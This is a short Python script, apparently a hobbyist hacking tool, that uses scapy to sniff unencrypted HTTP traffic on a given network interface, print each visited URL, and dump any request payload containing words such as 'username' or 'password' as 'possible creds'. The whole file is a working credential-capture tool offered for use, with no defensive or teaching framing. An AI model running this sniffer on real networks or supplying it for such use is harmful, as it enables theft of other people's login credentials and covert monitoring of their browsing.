#!/usr/bin/python3

'''
author : billy_j03l

'''

import time
import scapy.all as scapy
import argparse
import re
from scapy.layers import http
import os


def get_iface():
    parser=argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="iface",help="listening interface")
    options=parser.parse_args()
    if not options.iface:
        parser.error("[-] please specify an interface, use --help for info")
        exit(1)
    else:
       return options.iface

def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed)


def GetUrl(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def GetLogin(packet):
    if packet.haslayer(scapy.Raw): 
        load=packet[scapy.Raw].load
        keywords=["user","username","login","password","pass","uname"]
        for keyword in keywords:
            if keyword in str(load):
                return load

def process_sniffed(packet):
    if packet.haslayer(http.HTTPRequest):   
        #print(packet.show())
        url=GetUrl(packet)
        print("[+] visited:",str(url))
        login_info=GetLogin(packet)
        if login_info:
            print("possible creds:",login_info)

os.system("figlet Packet Sniffer")
print("\n\t\t\t\t\t by billy_j03l\n\n")

iface=get_iface()
sniff(iface)
